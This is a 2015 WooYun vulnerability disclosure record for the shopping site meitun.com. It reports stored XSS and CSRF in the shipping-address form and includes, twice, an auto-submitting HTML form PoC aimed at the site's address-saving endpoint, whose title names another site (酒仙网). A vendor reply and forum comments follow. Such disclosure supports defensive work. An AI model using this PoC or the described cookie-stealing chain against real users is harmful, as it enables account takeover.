{"id": 31486, "wybug_id": "wooyun-2015-0113851", "wybug_title": "美囤妈妈xss+csrf获取其他用户信息", "wybug_corp": "美囤妈妈", "wybug_author": "milan", "wybug_date": "2015-05-13 10:59", "wybug_open_date": "2015-06-27 12:34", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "利用技巧", "黑盒测试技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-27：\t细节向公众公开  简要描述： 求奖品啊     详细说明：  美囤妈妈收货地址存在xsrf，收货地址可以可以xss，但是输入了xss无法提交订单，估计可以绕过去，但是没有详细的去看。利用其实也挺简单，在社区发个链接，当用户执行我的csrf时，csrf中地址带有xss，就获取到了其他用户的cookie。收货地址存在xss\n\n收货地址同时存在csrf，收货地址是带有一个用户id的，把这用户id删了即可。poc如下\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=GB2312\"> <title>酒仙网CSRF POC</title> </head> <body><form method=\"POST\" name=\"form0\" action=\"http://salesorder.meitun.com:80/consignee/saveConsignee\"><input type=\"hidden\" name=\"name\" value=\"123123\"/><input type=\"hidden\" name=\"provinceId\" value=\"665\"/><input type=\"hidden\" name=\"cityId\" value=\"666\"/><input type=\"hidden\" name=\"countyId\" value=\"674\"/><input type=\"hidden\" name=\"streetId\" value=\"676\"/><input type=\"hidden\" name=\"addressId\" value=\"676\"/><input type=\"hidden\" name=\"address\" value=\"张是哪张是哪张是哪\"/><input type=\"hidden\" name=\"mobile\" value=\"15512341234\"/><input type=\"hidden\" name=\"isDefault\" value=\"true\"/><input type=\"hidden\" name=\"province\" value=\"天津\"/><input type=\"hidden\" name=\"city\" value=\"市辖区\"/><input type=\"hidden\" name=\"county\" value=\"河东区\"/><input type=\"hidden\" name=\"street\" value=\"大直沽街道\"/></form><script>document.forms[0].submit(); </script> </body></html>\n   漏洞证明：  美囤妈妈收货地址存在xsrf，收货地址可以可以xss，但是输入了xss无法提交订单，估计可以绕过去，但是没有详细的去看。利用其实也挺简单，在社区发个链接，当用户执行我的csrf时，csrf中地址带有xss，就获取到了其他用户的cookie。收货地址存在xss\n\n收货地址同时存在csrf，收货地址是带有一个用户id的，把这用户id删了即可。poc如下\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=GB2312\"> <title>酒仙网CSRF POC</title> </head> <body><form method=\"POST\" name=\"form0\" action=\"http://salesorder.meitun.com:80/consignee/saveConsignee\"><input type=\"hidden\" name=\"name\" value=\"123123\"/><input type=\"hidden\" name=\"provinceId\" value=\"665\"/><input type=\"hidden\" name=\"cityId\" value=\"666\"/><input type=\"hidden\" name=\"countyId\" value=\"674\"/><input type=\"hidden\" name=\"streetId\" value=\"676\"/><input type=\"hidden\" name=\"addressId\" value=\"676\"/><input type=\"hidden\" name=\"address\" value=\"张是哪张是哪张是哪\"/><input type=\"hidden\" name=\"mobile\" value=\"15512341234\"/><input type=\"hidden\" name=\"isDefault\" value=\"true\"/><input type=\"hidden\" name=\"province\" value=\"天津\"/><input type=\"hidden\" name=\"city\" value=\"市辖区\"/><input type=\"hidden\" name=\"county\" value=\"河东区\"/><input type=\"hidden\" name=\"street\" value=\"大直沽街道\"/></form><script>document.forms[0].submit(); </script> </body></html>\n   修复方案：  你们最专业   版权声明：转载请注明来源 milan@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-05-13 12:32 厂商回复： 已知漏洞，我们之前的修复方案不太完善。还是感谢洞主，欢迎继续关注！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-13 12:19 |    \t\t大表哥_ \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:10        )\t\t \n  小厂商给的又低，两手空空    \n     2015-05-13 12:42 |    \t\tmilan \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:32        | 妈妈说：搬不完砖就别回家。)\t\t \n  @大表哥_ 是啊  真低  没意思    \n     2015-06-27 17:50 |    \t\tAlan* \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | 少壮不努力，长大捡垃圾)\t\t \n  <title>酒仙网CSRF POC</title>     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}